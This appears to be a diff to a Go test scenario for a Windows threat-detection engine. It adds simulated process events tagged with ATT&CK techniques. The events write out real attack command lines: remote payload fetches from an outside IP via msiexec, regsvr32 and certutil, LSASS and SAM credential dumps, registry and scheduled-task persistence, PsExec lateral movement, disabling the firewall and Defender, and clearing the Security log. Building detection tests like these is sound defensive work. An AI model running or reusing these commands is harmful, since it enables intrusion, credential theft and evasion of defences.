@@ -52,12 +52,33 @@ var scenario = []*model.Event{
                         CommandLine: "certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\\Users\\Public\\payload.exe",
                         Image:       `C:\Windows\System32\certutil.exe`},
         }),
+        // T1218.005 - remote MSI installation (offensive)
+        offensive(&model.Event{
+                Type: model.TypeProcessCreate,
+                Process: &model.Process{PID: 6801, PPID: 6612, Name: "msiexec.exe",
+                        CommandLine: "msiexec.exe /q /i http://185.220.101.47/payload.msi",
+                        Image:       `C:\Windows\System32\msiexec.exe`},
+        }),
         // T1003.001 - LSASS dump via comsvcs.dll (offensive)
         offensive(&model.Event{
                 Type: model.TypeProcessCreate,
                 Process: &model.Process{PID: 6721, PPID: 6612, Name: "rundll32.exe",
                         CommandLine: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full`,
                         Image:       `C:\Windows\System32\rundll32.exe`},
+        }),
+        // T1003.001 - LSASS dump via signed procdump (offensive)
+        offensive(&model.Event{
+                Type: model.TypeProcessCreate,
+                Process: &model.Process{PID: 6845, PPID: 6612, Name: "procdump.exe",
+                        CommandLine: `procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass2.dmp`,
+                        Image:       `C:\Windows\System32\procdump.exe`},
+        }),
+        // T1003.002 - SAM hive dump (offensive)
+        offensive(&model.Event{
+                Type: model.TypeProcessCreate,
+                Process: &model.Process{PID: 6834, PPID: 6612, Name: "reg.exe",
+                        CommandLine: `reg.exe save HKLM\SAM C:\Users\Public\sam.hiv`,
+                        Image:       `C:\Windows\System32\reg.exe`},
         }),
         // T1053.005 - scheduled task persistence (offensive)
         offensive(&model.Event{
@@ -66,6 +87,13 @@ var scenario = []*model.Event{
                         CommandLine: `schtasks.exe /create /tn "MicrosoftEdgeUpdaterCore" /sc onlogon /ru SYSTEM /tr "C:\Users\Public\payload.exe"`,
                         Image:       `C:\Windows\System32\schtasks.exe`},
         }),
+        // T1547.001 - Run key persistence (offensive)
+        offensive(&model.Event{
+                Type: model.TypeProcessCreate,
+                Process: &model.Process{PID: 6777, PPID: 6612, Name: "reg.exe",
+                        CommandLine: `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /t REG_SZ /d C:\Users\Public\payload.exe /f`,
+                        Image:       `C:\Windows\System32\reg.exe`},
+        }),
         // T1047 - WMI process execution (offensive)
         offensive(&model.Event{
                 Type: model.TypeProcessCreate,
@@ -73,12 +101,40 @@ var scenario = []*model.Event{
                         CommandLine: `wmic.exe /node:LAB-WKS-02 process call create "cmd.exe /c C:\Users\Public\payload.exe"`,
                         Image:       `C:\Windows\System32\wbem\WMIC.exe`},
         }),
+        // T1021.002 - lateral movement with PsExec (offensive)
+        offensive(&model.Event{
+                Type: model.TypeProcessCreate,
+                Process: &model.Process{PID: 6856, PPID: 6612, Name: "psexec.exe",
+                        CommandLine: `psexec.exe \\LAB-WKS-02 -accepteula -c C:\Users\Public\payload.exe`,
+                        Image:       `C:\Windows\System32\psexec.exe`},
+        }),
         // T1562.001 - Defender tampering (offensive)
         offensive(&model.Event{
                 Type: model.TypeProcessCreate,
                 Process: &model.Process{PID: 6755, PPID: 6612, Name: "powershell.exe",
                         CommandLine: "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true",
                         Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
+        }),
+        // T1562.004 - firewall impairment (offensive)
+        offensive(&model.Event{
+                Type: model.TypeProcessCreate,
+                Process: &model.Process{PID: 6812, PPID: 6612, Name: "netsh.exe",
+                        CommandLine: "netsh.exe advfirewall set allprofiles state off",
+                        Image:       `C:\Windows\System32\netsh.exe`},
+        }),
+        // T1070.001 - clear event logs (offensive)
+        offensive(&model.Event{
+                Type: model.TypeProcessCreate,
+                Process: &model.Process{PID: 6823, PPID: 6612, Name: "wevtutil.exe",
+                        CommandLine: "wevtutil.exe cl Security",
+                        Image:       `C:\Windows\System32\wevtutil.exe`},
+        }),
+        // T1218.010 - regsvr32 scriptlet execution (offensive)
+        offensive(&model.Event{
+                Type: model.TypeProcessCreate,
+                Process: &model.Process{PID: 6790, PPID: 6612, Name: "regsvr32.exe",
+                        CommandLine: "regsvr32.exe /u /i:http://185.220.101.47/scrobj.dll scrobj",
+                        Image:       `C:\Windows\System32\regsvr32.exe`},
         }),
         // T1490 - inhibit recovery, VSS deletion (offensive)
         offensive(&model.Event{
